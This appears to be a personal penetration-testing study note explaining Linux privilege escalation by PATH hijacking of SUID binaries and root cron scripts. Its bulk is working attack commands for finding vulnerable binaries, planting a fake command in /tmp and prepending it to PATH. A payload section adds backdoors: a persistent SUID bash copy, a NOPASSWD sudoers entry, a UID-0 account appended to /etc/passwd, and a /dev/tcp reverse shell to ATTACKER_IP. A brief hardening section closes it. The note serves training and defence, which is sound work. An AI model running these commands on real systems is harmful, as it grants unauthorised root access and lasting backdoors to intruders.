# Linux PrivEsc — 02. PATH Hijacking

> **Author:** Rasel Hossain | raselhossain79 | TryHackMe: theloser

---

## What is PATH?

`$PATH` is an environment variable that tells the shell **where to look for executable files** when you type a command.

```bash
echo $PATH
# Output: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**Breakdown of PATH:**
- Multiple directories separated by `:` colon
- When you type `cat`, shell searches each directory LEFT TO RIGHT
- First match wins → that binary gets executed
- If `cat` is in `/usr/bin/cat`, it runs `/usr/bin/cat`

---

## The Vulnerability

When a SUID binary or a root-owned script calls another command **without its full absolute path**:

```c
// Developer wrote this (VULNERABLE)
int main() {
    setuid(0);              // Run as root
    system("cat /etc/motd"); // Called 'cat' without full path!
    return 0;
}
```

Vs safe version:
```c
// Safe version
system("/bin/cat /etc/motd"); // Full absolute path - not exploitable
```

**Why it's vulnerable:**
- `system("cat ...")` asks the shell to find `cat` using `$PATH`
- We can CONTROL `$PATH`
- We can put our own malicious `cat` script FIRST in `$PATH`
- Root binary runs our malicious script AS ROOT

---

## Step-by-Step Exploitation

### Step 1 — Find SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```
**Breakdown:**
- `find /` = search entire filesystem
- `-perm -4000` = SUID bit set
- `-type f` = regular files only
- `2>/dev/null` = suppress "Permission denied" errors

Focus on **non-standard** binaries (not `/bin/ping`, `/usr/bin/sudo`, etc.)
Look for custom binaries in: `/usr/local/bin/`, `/opt/`, `/home/`, `/tmp/`

### Step 2 — Analyze What Commands It Calls

#### Method A: strings (Read embedded text)

```bash
strings /usr/local/bin/targetbinary
```
**Breakdown:**
- `strings` = extract printable ASCII strings from binary files
- Shows human-readable text embedded in the compiled binary
- Look for: command names without `/` prefix (e.g., `service`, `cat`, `python`, `date`)
- If you see `/bin/cat` = full path = NOT exploitable this way
- If you see just `cat` = no full path = EXPLOITABLE

#### Method B: ltrace (Library call tracer)

```bash
ltrace /usr/local/bin/targetbinary
```
**Breakdown:**
- `ltrace` = traces library function calls made by a program
- Shows calls to: `system()`, `popen()`, `execve()`, `printf()`, `malloc()`, etc.
- Key line: `system("service apache2 start")` = calls `service` without full path
- Must run the binary for ltrace to work

#### Method C: strace (System call tracer)

```bash
strace /usr/local/bin/targetbinary
```
**Breakdown:**
- `strace` = traces system calls made by a program
- Lower level than ltrace — shows kernel-level calls
- Look for: `execve("/bin/sh", ["sh", "-c", "service ..."])` = confirms which command is called
- More verbose than ltrace

### Step 3 — Find a Writable Directory

```bash
find / -writable -type d 2>/dev/null
```
**Breakdown:**
- `-writable` = directories current user can write to
- `/tmp` = almost always writable, perfect for this attack
- `/dev/shm` = RAM-based filesystem, also often writable

### Step 4 — Create the Malicious File

If the binary calls `service` without full path:

```bash
# Spawn a bash shell as root
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
```
**Breakdown:**
- `echo '/bin/bash -p'` = write the command into the file
- `>` = redirect output to file (creates file if not exists, overwrites if exists)
- `/tmp/service` = our malicious "service" file in /tmp
- `chmod +x` = make it executable (without this, it won't run)
- `/bin/bash -p` = spawn bash. `-p` = privileged mode (explained below)

#### Why `-p` flag is critical:

```bash
/bin/bash       # Drops SUID privileges (security feature)
/bin/bash -p    # Preserves EUID (Effective User ID = root from SUID)
```
- Without `-p`: bash drops root privileges for security → you get normal shell
- With `-p`: bash keeps the SUID root privilege → you get root shell

### Step 5 — Hijack the PATH Variable

```bash
export PATH=/tmp:$PATH
```
**Breakdown:**
- `export` = make the variable available to child processes
- `PATH=/tmp:$PATH` = prepend `/tmp` to the existing PATH
- Now PATH = `/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`
- When shell looks for `service`, it checks `/tmp` FIRST
- Finds `/tmp/service` (our malicious file) before `/usr/sbin/service`

```bash
echo $PATH    # Verify /tmp is now first
```

### Step 6 — Execute the SUID Binary

```bash
/usr/local/bin/targetbinary
```

**What happens:**
1. Binary runs → SUID bit makes it run as root (UID=0)
2. Binary calls `system("service ...")` internally
3. Shell searches `$PATH` for `service`
4. Finds `/tmp/service` FIRST (our malicious file)
5. Executes `/tmp/service` AS ROOT
6. `/tmp/service` runs `/bin/bash -p` → spawns root shell!

```bash
# Verify root
whoami    # root
id        # uid=0(root) gid=0(root)
```

---

## Alternative Malicious Payloads

Instead of just spawning a shell, you can do more:

### Option 1: Spawn Root Shell (Basic)
```bash
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
```

### Option 2: Copy bash with SUID bit
```bash
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /tmp/service
chmod +x /tmp/service
# After running vulnerable binary:
/tmp/rootbash -p    # Root shell anytime, even after PATH is reset
```
**Breakdown:**
- `cp /bin/bash /tmp/rootbash` = copy bash binary to /tmp
- `chmod +s` = set SUID bit on our copy
- Later: `/tmp/rootbash -p` = execute our SUID bash as root (persistent!)

### Option 3: Add Sudo Nopasswd Rule
```bash
echo 'echo "ALL ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > /tmp/service
chmod +x /tmp/service
# After running: sudo su = root
```

### Option 4: Add New Root User to /etc/passwd
```bash
# Generate password hash first
openssl passwd -1 -salt hacker password123
# Output: $1$hacker$abc123...

echo 'echo "hacker:\$1\$hacker\$abc123...:0:0:root:/root:/bin/bash" >> /etc/passwd' > /tmp/service
chmod +x /tmp/service
# After running: su hacker (enter: password123) = root
```
**Breakdown:**
- `openssl passwd -1` = generate MD5 password hash
- `-salt hacker` = use "hacker" as the salt (makes hash unique)
- Append line to `/etc/passwd` with UID=0, GID=0 (root)

### Option 5: Reverse Shell as Root
```bash
cat > /tmp/service << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /tmp/service
# Listen on attacker: nc -lvnp 4444
```
**Breakdown:**
- `bash -i` = interactive bash
- `>& /dev/tcp/IP/PORT` = redirect stdout+stderr to TCP connection
- `0>&1` = redirect stdin from the TCP connection
- Result: reverse shell connecting to attacker as root

---

## Real Scenario Walkthrough

```bash
# 1. Find SUID binary
find / -perm -4000 -type f 2>/dev/null
# Found: /usr/local/bin/sysinfo

# 2. Analyze it
strings /usr/local/bin/sysinfo
# Output shows: "service" and "uname" without full paths

# 3. Confirm with ltrace
ltrace /usr/local/bin/sysinfo
# Output: system("service --status-all") = called without /usr/sbin/service
# Output: system("uname -a") = called without /bin/uname

# 4. Create malicious files
echo '/bin/bash -p' > /tmp/service
echo '/bin/bash -p' > /tmp/uname
chmod +x /tmp/service /tmp/uname

# 5. Hijack PATH
export PATH=/tmp:$PATH

# 6. Run the SUID binary
/usr/local/bin/sysinfo
# Root shell spawns!

# 7. Confirm
id
# uid=0(root) gid=0(root)
```

---

## PATH Hijacking via sudo Script

Sometimes the vulnerability is in a script that root runs via cron or sudo:

```bash
# Script content of /usr/local/bin/backup.sh (run as root via cron)
#!/bin/bash
cd /var/backups
tar czf backup.tar.gz /home/
date >> /var/log/backup.log   # <-- 'date' called without full path!
```

```bash
# Exploitation:
echo '/bin/bash -p' > /tmp/date
chmod +x /tmp/date
export PATH=/tmp:$PATH
# Wait for cron to run (or trigger manually if possible)
# When script runs: date → finds /tmp/date → root shell
```

---

## PATH Check Commands

```bash
# See current PATH
echo $PATH

# Find which version of a command would run
which service
type service

# Verify our malicious file is found first
which cat    # Should show /tmp/cat if PATH is hijacked
```
**Breakdown:**
- `which command` = shows full path of what would be executed
- `type command` = shows type and path (bash builtin vs external)
- If `which cat` shows `/tmp/cat` = PATH hijack is in place

---

## Detection (Blue Team / Hardening)

```bash
# Always use full paths in scripts
/usr/sbin/service apache2 start    # Safe
service apache2 start               # Vulnerable

# Secure PATH in scripts
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Check for PATH manipulation attempts
grep -r "export PATH" /etc/cron* /opt/ /usr/local/

# Audit SUID binaries regularly
find / -perm -4000 -type f 2>/dev/null
```

---

## Quick Reference

```
[ ] find / -perm -4000 2>/dev/null          → find SUID binaries
[ ] strings /path/to/suid                    → find commands called without full path
[ ] ltrace /path/to/suid                     → trace library calls (system())
[ ] find / -writable -type d 2>/dev/null     → find writable directories
[ ] echo '/bin/bash -p' > /tmp/CMDNAME       → create malicious file
[ ] chmod +x /tmp/CMDNAME                    → make it executable
[ ] export PATH=/tmp:$PATH                   → hijack PATH
[ ] /path/to/suid-binary                     → trigger exploit
[ ] id                                       → confirm root
```
